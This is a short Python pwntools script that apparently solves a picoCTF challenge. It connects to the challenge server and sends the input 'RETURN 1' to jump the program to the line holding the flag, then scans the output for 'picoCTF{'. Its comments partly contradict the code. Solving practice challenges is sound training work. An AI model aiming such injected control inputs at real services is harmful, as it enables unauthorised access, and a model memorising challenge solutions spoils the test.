from pwn import *

host = 'verbal-sleep.picoctf.net'
port = 60575

def solve():
    io = remote(host, port)

    try:
        # Wait for the VERY FIRST prompt to save our line quota
        io.recvuntil(b'Crowd: ')
        
        # Jump directly to line 0
        log.info("Jumping to Line 0 to catch the flag immediately...")
        io.sendline(b'RETURN 1')

        # Now, just read everything until the connection closes
        # The flag is at the very top of the song
        output = io.recvall(timeout=5).decode()
        
        print("\n--- Top of the Program Output ---")
        # Look specifically at the first 10 lines of the new output
        print(output)

        if "picoCTF{" in output:
            log.success("FOUND IT!")
        else:
            log.warning("Still not seeing it? Try jumping to RETURN 1 or 2.")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        io.close()

if __name__ == "__main__":
    solve()
